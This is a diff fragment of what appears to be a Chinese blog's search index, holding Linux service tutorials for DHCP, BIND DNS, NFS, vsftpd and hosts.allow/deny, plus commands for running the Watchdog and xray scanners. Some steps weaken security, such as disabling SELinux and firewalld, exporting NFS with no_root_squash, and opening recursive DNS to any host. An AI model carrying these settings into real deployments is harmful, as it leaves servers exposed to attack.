-<h3 id="url-扫描"><a href="#url-扫描" class="headerlink" title="url 扫描"></a>url 扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动url扫描</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;urlscan&#x2F;url_probe  </span><br><span class="line">sudo python3 -u urlscan_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u urlscan_run.py &gt; url.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat url.log</span><br></pre></td></tr></table></figure>
-<h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动xray</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;urlscan&#x2F;xray</span><br><span class="line">sudo python3 -u xray_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u xray_run.py &gt; xray.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat xray.log</span><br></pre></td></tr></table></figure>
-<h3 id="重置环境"><a href="#重置环境" class="headerlink" title="重置环境"></a>重置环境</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  进入 Watchdog 目录</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog</span><br><span class="line">#  重置数据库</span><br><span class="line">sudo flask resetdb</span><br><span class="line">#  创建数据库</span><br><span class="line">sudo flask createdb</span><br><span class="line">#  创建测试账户</span><br><span class="line">sudo flask createuser</span><br><span class="line">#  启动服务（需确保端口没被占用）</span><br><span class="line">sudo flask run -p 8080 -h 0.0.0.0</span><br><span class="line"></span><br><span class="line">#  后台运行（需确保端口没被占用）</span><br><span class="line">sudo nohup flask run -p 8080 -h 0.0.0.0 &gt; web.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat web.log</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>信息收集</category>
-      </categories>
-      <tags>
-        <tag>信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DHCP</title>
-    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DHCP/DHCP/</url>
-    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>DHCP（动态主机配置协议）是一个局域网的网络协议。为主机分配 IP 地址。</p>
-<p>安装：<code>yum -y install dhcp</code><br>默认端口：<code>67/68</code><br>主配置文件：<code>/etc/dhcp/dhcpd.conf</code><br>模板文件：<code>/usr/share/doc/dhcp-4.2.5/dhcpd.conf.example</code><br>执行程序：<code>/usr/sbin/dhcpd、/usr/sbin/dhcrelay</code><br>执行参数配置：<code>/etc/sysconfig/dhcpd</code><br>查看租约文件：<code>/var/lib/dhcpd/dhcpd.lease</code><br>网络服务的排错日志：<code>/var/log/messages</code></p>
-<h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">log-facility local7;    #  指定日志文件</span><br><span class="line">ddns-update-style none; #  设置 DNS 的更新方式（可用参数：standard、interim、none）</span><br><span class="line">ignore client-updates;  #  不允许客户端更新 DNS 记录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">subnet 192.168.1.0 netmask 255.255.255.0 &#123;    #  声明子网</span><br><span class="line">  range 192.168.1.1 192.168.1.253;    #  设置范围</span><br><span class="line">  option domain-name-servers 114.114.114.114;	#  设置 DNS</span><br><span class="line">  option domain-name &quot;www.test.com&quot;;  #  设置 DNS 域</span><br><span class="line">  option routers 192.168.1.254;       #  设置网关</span><br><span class="line">  option broadcast-address 192.168.1.255;		#  设置广播地址</span><br><span class="line">  default-lease-time 600; #  默认租期（单位：秒）</span><br><span class="line">  max-lease-time 7200;    #  最大租期（单位：秒）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">host fantasia &#123;</span><br><span class="line">  hardware ethernet 08:00:07:26:c0:a5;  #  设置目标主机的 MAC 地址</span><br><span class="line">  fixed-address 192.168.1.111;          #  设置为其分配的保留 IP</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><h3 id="1、拷贝模板文件"><a href="#1、拷贝模板文件" class="headerlink" title="1、拷贝模板文件"></a>1、拷贝模板文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  删除原配置文件（原配置文件内无参数）</span><br><span class="line">rm -f &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf</span><br><span class="line">#  拷贝模板文件并更名为配置文件</span><br><span class="line">cp -p &#x2F;usr&#x2F;share&#x2F;doc&#x2F;dhcp-4.2.5&#x2F;dhcpd.conf.example &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf</span><br><span class="line">#  备份配置文件</span><br><span class="line">cp -p &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf.bak_2020.11.13</span><br></pre></td></tr></table></figure>
-<h3 id="2、编辑配置文件"><a href="#2、编辑配置文件" class="headerlink" title="2、编辑配置文件"></a>2、编辑配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  可在配置文件内只保留如下内容（配置文件内有该内容）</span><br><span class="line">subnet 192.168.1.0 netmask 255.255.255.0 &#123;    #  声明子网</span><br><span class="line">  range 192.168.1.1 192.168.1.253;    #  设置范围</span><br><span class="line">  option domain-name-servers 114.114.114.114;	#  设置 DNS</span><br><span class="line">  option domain-name &quot;www.test.com&quot;;  #  设置 DNS 域</span><br><span class="line">  option routers 192.168.1.254;       #  设置网关</span><br><span class="line">  option broadcast-address 192.168.1.255;		#  设置广播地址</span><br><span class="line">  default-lease-time 600; #  默认租期（单位：秒）</span><br><span class="line">  max-lease-time 7200;    #  最大租期（单位：秒）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">host fantasia &#123;</span><br><span class="line">  hardware ethernet 08:00:07:26:c0:a5;  #  设置目标主机的 MAC 地址</span><br><span class="line">  fixed-address 192.168.1.111;          #  设置为其分配的保留 IP</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>网络应用竞赛</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DNS</title>
-    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DNS/DNS/</url>
-    <content><![CDATA[<h2 id="配置-DNS"><a href="#配置-DNS" class="headerlink" title="配置 DNS"></a>配置 DNS</h2><p><strong>一、简介</strong></p>
-<p>把域名翻译成IP地址的软件称为域名系统，即 DNS<br>默认端口号：<code>53</code></p>
-<p><strong>默认配置文件路径：</strong></p>
-<p>主要配置文件（定义 bind 服务程序的运行）： <code>/etc/named.conf</code><br>区域配置文件（保存域名和IP地址对应关系的所在位置）： <code>/etc/named.rfc1912.zones</code><br>数据文件目录： <code>/var/named</code></p>
-<p>DNS域名解析的配置文件（系统自带）： <code>/etc/resolv.conf</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  resolv.conf 参数详解</span><br><span class="line"></span><br><span class="line">nameserver	#  定义 DNS 服务器的 IP 地址（查询时按照 namserver 在文件中的顺序进行）</span><br><span class="line">domain		#  定义本地域名</span><br><span class="line">search		#  定义域名的搜索列表（当查询的域名没找到时，则从该参数声明的域中按前后顺序查找）</span><br><span class="line">sortlist	#  对返回的域名进行排序</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="二、实例"><a href="#二、实例" class="headerlink" title="二、实例"></a>二、实例</h2><p><strong>环境：</strong></p>
-<p>centos 7，IP：10.1.82.232</p>
-<h3 id="1、安装相关包"><a href="#1、安装相关包" class="headerlink" title="1、安装相关包"></a>1、安装相关包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  安装 dns 相关包（bind：DNS 服务程序，bind-utils：提供 DNS 工具包（域名解析和DNS调试））</span><br><span class="line">yum -y install bind bind-utils</span><br></pre></td></tr></table></figure>
-<h3 id="2、编辑主要配置文件"><a href="#2、编辑主要配置文件" class="headerlink" title="2、编辑主要配置文件"></a>2、编辑主要配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;named.conf     #  编辑 named.conf</span><br><span class="line"></span><br><span class="line">将    listen-on port 53 &#123; 127.0.0.1; &#125;;  跟  allow-query     &#123; localhost; &#125;;</span><br><span class="line">改为  listen-on port 53 &#123; any; &#125;;        和  allow-query     &#123; any; &#125;; 即可</span><br></pre></td></tr></table></figure>
-<p><code>named.conf</code> 配置文件详解</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  named.conf 配置文件详解</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; named.conf</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Provided by Red Hat bind package to configure the ISC BIND named(8) DNS</span><br><span class="line">&#x2F;&#x2F; server as a caching only nameserver (as a localhost DNS resolver only).</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; See &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bind*&#x2F;sample&#x2F; for example named configuration files.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; See the BIND Administrator&#39;s Reference Manual (ARM) for details about the</span><br><span class="line">&#x2F;&#x2F; configuration located in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;bind-&#123;version&#125;&#x2F;Bv9ARM.html</span><br><span class="line"></span><br><span class="line">options &#123;</span><br><span class="line">	listen-on port 53 &#123; any; &#125;;                   #  允许所有 IP 监听本机 53 端口（即所有用户能与本机的 DNS 进行通信）</span><br><span class="line">	listen-on-v6 port 53 &#123; ::1; &#125;;                #  IPV6 监听地址</span><br><span class="line">	directory 	&quot;&#x2F;var&#x2F;named&quot;;		              #  服务器的工作目录</span><br><span class="line">	dump-file 	&quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;cache_dump.db&quot;;  #  当执行 rndc dumpdb 时服务器 dump 文件的路径</span><br><span class="line">	statistics-file &quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;named_stats.txt&quot;;		    #  当服务器接收到 rndc stats 命令时，追加统计数据的文件路径</span><br><span class="line">	memstatistics-file &quot;&#x2F;var&#x2F;named&#x2F;data&#x2F;named_mem_stats.txt&quot;;	#  当退出服务器时，会将服务器的统计信息写道文件中</span><br><span class="line">	allow-query     &#123; any; &#125;;		              #  允许所有 IP 进行 DNS 查询</span><br><span class="line"></span><br><span class="line">	&#x2F;* </span><br><span class="line">	 - If you are building an AUTHORITATIVE DNS server, do NOT enable recursion.</span><br><span class="line">	 - If you are building a RECURSIVE (caching) DNS server, you need to enable </span><br><span class="line">	   recursion. </span><br><span class="line">	 - If your recursive DNS server has a public IP address, you MUST enable access </span><br><span class="line">	   control to limit queries to your legitimate users. Failing to do so will</span><br><span class="line">	   cause your server to become part of large scale DNS amplification </span><br><span class="line">	   attacks. Implementing BCP38 within your network would greatly</span><br><span class="line">	   reduce such attack surface </span><br><span class="line">	*&#x2F;</span><br><span class="line">	recursion yes;		    #  允许进行递归搜索</span><br><span class="line"></span><br><span class="line">	dnssec-enable yes;      #  开启 DNSSEC 开关</span><br><span class="line">	dnssec-validation yes;	#  开启 DNSSEC 确认开关</span><br><span class="line"></span><br><span class="line">	&#x2F;* Path to ISC DLV key *&#x2F;</span><br><span class="line">	bindkeys-file &quot;&#x2F;etc&#x2F;named.iscdlv.key&quot;;		    #  加密用的 key</span><br><span class="line"></span><br><span class="line">	managed-keys-directory &quot;&#x2F;var&#x2F;named&#x2F;dynamic&quot;;	#  管理密钥的路径</span><br><span class="line"></span><br><span class="line">	pid-file &quot;&#x2F;run&#x2F;named&#x2F;named.pid&quot;;		        #  服务器记录进程 ID 的文件路径</span><br><span class="line">	session-keyfile &quot;&#x2F;run&#x2F;named&#x2F;session.key&quot;;	    #  会话密钥文件</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">logging &#123;	#  定义 bing 服务的日志</span><br><span class="line">        channel default_debug &#123;		    #  日志输出方式</span><br><span class="line">                file &quot;data&#x2F;named.run&quot;;  #  输出到指定文件</span><br><span class="line">                severity dynamic;	    #  按照服务器当前的 debug 级别记录日志</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;.&quot; IN &#123;			#  定义域区（一个 zone 关键字定义一个域区）</span><br><span class="line">	type hint;		    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">	file &quot;named.ca&quot;;	#  指定存放 DNS 记录文件的文件名（默认路径在 &#x2F;var&#x2F;named 下）</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">#  包含区域配置文件，用于设置正反向区域（也可在当前文件中配置正反向区域）</span><br><span class="line">include &quot;&#x2F;etc&#x2F;named.rfc1912.zones&quot;;	#  如果把该行注释则 named.rfc1912.zones 文件内的配置无效</span><br><span class="line">include &quot;&#x2F;etc&#x2F;named.root.key&quot;;		#  根区域的 key 文件（与事务签名相关）</span><br></pre></td></tr></table></figure>
-<h3 id="3、编辑区域配置文件"><a href="#3、编辑区域配置文件" class="headerlink" title="3、编辑区域配置文件"></a>3、编辑区域配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;named.rfc1912.zones	#  编辑区域文件</span><br><span class="line"></span><br><span class="line">在文件末尾添加正反向区域</span><br><span class="line">zone &quot;test.com&quot; IN &#123;		#  定义正向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">	type master;		    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">	file &quot;test.com.zone&quot;;	#  指定存放正向区域记录文件的文件名（默认路径在 &#x2F;var&#x2F;named 下）</span><br><span class="line">	allow-update &#123; none; &#125;;	#  设置允许从何处动态更新 DNS记录 的客户端地址（做主从服务器时需用到，做主从时需把从处的 none 更改为主服务器的地址）</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;82.1.10.in-addr.arpa&quot; IN &#123;	#  定义反向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">	type master;			        #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">	file &quot;10.1.82.zone&quot;;		#  指定存放正向区域记录文件的文件名（默认路径在 &#x2F;var&#x2F;named 下）</span><br><span class="line">	allow-update &#123; none; &#125;;		#  设置允许从何处动态更新 DNS记录 的客户端地址（做主从服务器时需用到，做主从时需把从处的 none 更改为主服务器的地址）</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<h3 id="4、配置正向区域"><a href="#4、配置正向区域" class="headerlink" title="4、配置正向区域"></a>4、配置正向区域</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  复制 named.localhost 文件及其属性并改名为 test.com.zone 放置在原位置</span><br><span class="line">cp -p &#x2F;var&#x2F;named&#x2F;named.localhost &#x2F;var&#x2F;named&#x2F;test.com.zone</span><br><span class="line"></span><br><span class="line">#  配置正向区域文件</span><br><span class="line">$TTL 1D</span><br><span class="line">@	IN SOA	@ test.com. (</span><br><span class="line">					0	; serial</span><br><span class="line">					1D	; refresh</span><br><span class="line">					1H	; retry</span><br><span class="line">					1W	; expire</span><br><span class="line">					3H )	; minimum</span><br><span class="line">	NS	@</span><br><span class="line"></span><br><span class="line">#  必须有一行不加前缀的（如没有不加前缀的这一行，则会报错）</span><br><span class="line">	A	10.1.82.232      #  域名指向的 IP</span><br><span class="line">www	A	10.1.82.232      #  域名前缀跟指向的 IP</span><br><span class="line">	AAAA	::1</span><br></pre></td></tr></table></figure>
-<h3 id="5、配置反向区域"><a href="#5、配置反向区域" class="headerlink" title="5、配置反向区域"></a>5、配置反向区域</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  复制 named.loopback 文件及其属性并改名为 10.1.82.zone 放置在原位置</span><br><span class="line">cp -p &#x2F;var&#x2F;named&#x2F;named.loopback &#x2F;var&#x2F;named&#x2F;10.1.82.zone</span><br><span class="line"></span><br><span class="line">#  配置反向区域文件</span><br><span class="line">$TTL 1D</span><br><span class="line">@	IN SOA	@ test.com. (</span><br><span class="line">					0	; serial</span><br><span class="line">					1D	; refresh</span><br><span class="line">					1H	; retry</span><br><span class="line">					1W	; expire</span><br><span class="line">					3H )	; minimum</span><br><span class="line">	NS	@</span><br><span class="line"></span><br><span class="line">#  必须有一行不加前缀的（如没有不加前缀的这一行，则会报错）</span><br><span class="line">	A	10.1.82.232      #  域名指向的 IP</span><br><span class="line">www	A	10.1.82.232      #  域名前缀跟指向的 IP</span><br><span class="line">	AAAA	::1</span><br><span class="line">232	PTR	www.test.com.    #  完整的域名跟对应的 IP 后缀（域名后面的点必须有）</span><br></pre></td></tr></table></figure>
-<h3 id="6、设置-DNS-解析"><a href="#6、设置-DNS-解析" class="headerlink" title="6、设置 DNS 解析"></a>6、设置 DNS 解析</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;resolv.conf	    #  编辑 DNS 域名解析配置文件</span><br><span class="line"></span><br><span class="line">nameserver 10.1.82.232      #  在 resolv.conf 文件末尾添加该行</span><br></pre></td></tr></table></figure>
-<p><code>systemctl restart named</code> 配置完后需使用该命令重启服务</p>
-<p>配置完后使用 nslookup dig 等工具进行测试即可</p>
-<hr>
-<h2 id="配置主从-DNS"><a href="#配置主从-DNS" class="headerlink" title="配置主从 DNS"></a>配置主从 DNS</h2><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p><strong>环境：</strong></p>
-<p>centos 7（主），IP：10.1.82.232<br>centos 7（从），IP：10.1.82.235</p>
-<h3 id="二、实例-1"><a href="#二、实例-1" class="headerlink" title="二、实例"></a>二、实例</h3><p>主服务器的配置文件照上正常配置即可</p>
-<p>从服务器只需在区域配置文件末尾中添加如下配置即可</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zone &quot;test.com&quot; IN &#123;			#  定义正向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">        type slave;			    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">        masters &#123; 10.1.82.232; &#125;;	    #  设置主服务器的 IP</span><br><span class="line">        file &quot;slaves&#x2F;test.com.zone&quot;;	#  设置主服务器正向区域的文件名</span><br><span class="line">        allow-update &#123; 10.1.82.232; &#125;;	#  设置主服务器的 IP（即允许从该地址获取动态更新 DNS 记录）</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone &quot;82.1.10.in-addr.arpa&quot; IN &#123;        #  定义反向域区（一个 zone 关键字定义一个域区）</span><br><span class="line">        type slave;                     #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）</span><br><span class="line">        masters &#123; 10.1.82.232; &#125;;	    #  设置主服务器的 IP</span><br><span class="line">        file &quot;slaves&#x2F;10.1.82.zone&quot;;	    #  设置主服务器反向区域的文件名</span><br><span class="line">        allow-update &#123; 10.1.82.232; &#125;;	#  设置主服务器的 IP（即允许从该地址获取动态更新 DNS 记录）</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p><code>systemctl restart named</code> 配置完后需使用该命令重启服务</p>
-<p>配置完后使用 nslookup dig 等工具进行测试即可</p>
-]]></content>
-      <categories>
-        <category>网络应用竞赛</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NFS</title>
-    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/NFS/NFS/</url>
-    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>NFS</code>（网络文件系统）能通过网络让不同的机器、系统共享彼此的文件</p>
-<p>配置文件（默认为空文件）：<code>/etc/exports</code><br>管理命令：<code>/usr/sbin/exportfs</code><br>共享资源的日志文件：<code>/var/lib/nfs/*tab</code><br>客户端查询共享资源命令：<code>/usr/sbin/showmount</code></p>
-<p><code>NFS</code> 服务主要进程：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpc.nfsd	#  最主要的 NFS 进程，管理客户端是否可登录</span><br><span class="line">rpc.mountd	#  挂载和卸载 NFS 文件系统，包括权限管理</span><br><span class="line">rpc.lockkd	#  管理文件锁，避免同时写出错（非必要）</span><br><span class="line">rpc.statd	#  检查文件一致性，可修复文件（非必要）</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><p><code>/etc/exports</code> 配置文件常用参数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ro		#  只读</span><br><span class="line">rw		#  读写</span><br><span class="line">sync		#  将数据同步写入内存缓冲区与磁盘中（效率低，但可保证数据的一致性）</span><br><span class="line">async		#  将数据先保存在内存缓冲区中，必要时才写入磁盘</span><br><span class="line">insecure	#  允许客户端从大于 1024 的 TCP&#x2F;IP 端口连接服务器</span><br><span class="line">secure（默认）          #  限制客户端只能从小于 1024 的 TCP&#x2F;IP 端口连接旧服务器</span><br><span class="line">wdelay（默认）          #  检查是否有相关的写入操作，如有则将这些写入操作一起执行（该参数为默认参数）</span><br><span class="line">subtree_check（默认）   #  若输出目录是一个子目录，则 NFS 服务器将检查其父目录的权限</span><br><span class="line">no_subtree_check       #  即使输出目录是一个子目录，NFS 服务器也不检查其父目录的权限（可提高效率）</span><br><span class="line">no_wdelay       #  若有写入操作则立即执行（应与 sync 配合使用）</span><br><span class="line">root_squash     #  将来访问的 root 用户映射为匿名用户或用户组</span><br><span class="line">no_root_squash	#  访问用户先与本机用户匹配，匹配失败后在映射为匿名用户或用户组</span><br><span class="line">all_squash      #  所有访问用户都映射为匿名用户或用户组</span><br><span class="line">no_all_squash	#  访问用户先与本机用户匹配，匹配失败后在映射为匿名用户或用户组</span><br></pre></td></tr></table></figure>
-<h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><h3 id="1、编辑配置文件"><a href="#1、编辑配置文件" class="headerlink" title="1、编辑配置文件"></a>1、编辑配置文件</h3><p>配置文件格式为：<code>路径 + IP、掩码 + 参数</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  创建需共享的文件夹</span><br><span class="line">mkdir -p &#x2F;data&#x2F;web_data</span><br><span class="line">#  在 &#x2F;etc&#x2F;exports 配置文件中添加如下内容</span><br><span class="line">&#x2F;data&#x2F;web_data		192.168.1.0&#x2F;24(rw,no_root_squash)</span><br></pre></td></tr></table></figure>
-<h3 id="2、刷新配置"><a href="#2、刷新配置" class="headerlink" title="2、刷新配置"></a>2、刷新配置</h3><p>刷新配置：<code>exportfs -a</code></p>
-<h3 id="3、重启服务"><a href="#3、重启服务" class="headerlink" title="3、重启服务"></a>3、重启服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart rpcbind</span><br><span class="line">systemctl restart nfs</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>网络应用竞赛</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SELinux 防火墙</title>
-    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/SELinux/SELinux/</url>
-    <content><![CDATA[<p><strong>注：</strong> 搭建服务前须关闭防火墙（否则会导致服务无法访问）</p>
-<h2 id="一、firewalld-防火墙"><a href="#一、firewalld-防火墙" class="headerlink" title="一、firewalld 防火墙"></a>一、firewalld 防火墙</h2><p>查看 firewalld 防火墙状态：<code>systemctl status firewalld</code><br>关闭 firewall 防火墙 <code>systemctl stop firewalld</code></p>
-<h2 id="二、SELinux-防火墙"><a href="#二、SELinux-防火墙" class="headerlink" title="二、SELinux 防火墙"></a>二、SELinux 防火墙</h2><p><strong>简介：</strong><br>SELinux(Security-Enhanced Linux) 是美国国家安全局（NSA）对于强制访问控制的实现，是 Linux历史上最杰出的新安全子系统。</p>
-<p><strong>SELinux 分三种模式</strong>：<br>Enforcing（强制模式）、Permissive（警告模式）、Disabled（关闭模式）</p>
-<p>查看防火墙当前状态：<code>getenforce</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  关闭 SELinux 防火墙</span><br><span class="line"></span><br><span class="line">vim &#x2F;etc&#x2F;selinux&#x2F;config		#  编辑 selinux 防火墙的配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># This file controls the state of SELinux on the system.</span><br><span class="line"># SELINUX&#x3D; can take one of these three values:</span><br><span class="line">#     enforcing - SELinux security policy is enforced.</span><br><span class="line">#     permissive - SELinux prints warnings instead of enforcing.</span><br><span class="line">#     disabled - No SELinux policy is loaded.</span><br><span class="line">SELINUX&#x3D;enforcing	#  需将此处更改为 disabled（默认为 enforcing）</span><br><span class="line"># SELINUXTYPE&#x3D; can take one of three two values:</span><br><span class="line">#     targeted - Targeted processes are protected,</span><br><span class="line">#     minimum - Modification of targeted policy. Only selected processes are protected. </span><br><span class="line">#     mls - Multi Level Security protection.</span><br></pre></td></tr></table></figure>
-<p>更改完后输入命令使其生效 <code>setenforce 0</code></p>
-]]></content>
-      <categories>
-        <category>网络应用竞赛</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hosts.allow、Hosts.deny 文件</title>
-    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/hosts.allow%E6%96%87%E4%BB%B6%E8%B7%9Fhosts.deny%E6%96%87%E4%BB%B6/hosts.allow%E3%80%81hosts.deny/</url>
-    <content><![CDATA[<p><strong>文件优先级：</strong> <code>先 deny，后 allow，如有冲突则按 allow 文件内的规则处理</code></p>
-<h2 id="hosts-allow-文件"><a href="#hosts-allow-文件" class="headerlink" title="hosts.allow 文件"></a>hosts.allow 文件</h2><p>hosts.allow 文件内的内容为允许服务列表<br>默认路径：<code>/etc/hosts.allow</code><br>格式：<code>服务名 + IP + allow</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sshd:all:allow      #  允许所有主机</span><br><span class="line">sshd:192.168.1.:allow       #  允许 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.*:allow      #  允许 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.0&#x2F;24:allow   #  允许 1.0 网段的所有主机</span><br></pre></td></tr></table></figure>
-
-<h2 id="hosts-deny-文件"><a href="#hosts-deny-文件" class="headerlink" title="hosts.deny 文件"></a>hosts.deny 文件</h2><p>hosts.deny 文件内的内容为拒绝服务列表<br>默认路径：<code>/etc/hosts.deny</code><br>格式：<code>服务名 + IP + deny</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sshd:all:deny       #  拒绝所有主机</span><br><span class="line">sshd:192.168.1.:deny        #  拒绝 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.*:deny       #  拒绝 1.X 的所有主机</span><br><span class="line">sshd:192.168.1.0&#x2F;24:deny    #  拒绝 1.0 网段的所有主机</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>网络应用竞赛</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VSFTP</title>
-    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/vsftp/vsftp/</url>
-    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>用户以文件操作的方式（如文件的增、删、改、查、传递等）与另一主机互相通信</p>
-<p><code>ftp</code> 有 <code>ASCII</code> 模式与 <code>Binary</code>（二进制） 模式</p>
-<ul>
-<li><code>ASCII</code> 模式用来传递 <code>HTML</code> 和文本编写的文件（如用 <code>Binary</code> 模式传递则会破坏-文件，导致文件执行出错）</li>
-<li><code>Binary</code> 模式用来传递可执行文件，压缩文件，和图片文件（如用 <code>ASCII</code> 模式传递，则会乱码）</li>
-</ul>
-<p>默认端口号</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">控制：21</span><br><span class="line">传输：20</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="二、安装及参数介绍"><a href="#二、安装及参数介绍" class="headerlink" title="二、安装及参数介绍"></a>二、安装及参数介绍</h2><p>安装 vsftp <code>yum -y install vsftpd</code></p>
-<p>默认配置文件 <code>/etc/vsftpd/vsftpd.conf</code></p>
-<p>PAM 认证配置文件路径 <code>/etc/pam.d</code></p>
-<p><code>vsftpd.conf</code> 配置文件常用参数：</p>
